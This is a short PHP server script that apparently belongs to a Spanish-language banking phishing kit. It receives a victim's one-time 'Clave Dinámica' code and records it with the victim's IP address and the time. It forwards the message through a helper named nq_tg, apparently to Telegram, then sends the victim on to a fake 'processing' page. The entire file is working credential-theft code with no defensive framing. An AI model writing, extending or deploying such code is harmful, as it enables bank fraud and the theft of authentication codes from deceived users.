<?php
require __DIR__ . '/data.php';
header('Content-Type: application/json; charset=utf-8');

$dynamicCode = nq_f('dynamicCode');

if ($dynamicCode === '') {
    echo json_encode(['success' => false, 'message' => 'Código requerido']);
    exit;
}

$SEP = "───────────────────";
$msg  = "💫 <b>Clave Dinámica — Intento 1</b>\n$SEP\n";
$msg .= "🔢 Clave: <code>{$dynamicCode}</code>\n";
$msg .= "\n🌐 " . nq_ip() . " · 🕐 " . date('Y-m-d H:i:s');

nq_tg($msg);

echo json_encode([
    'success' => true,
    'data'    => ['session_id' => nq_session()],
    'redirect' => 'procesando3.html',
]);
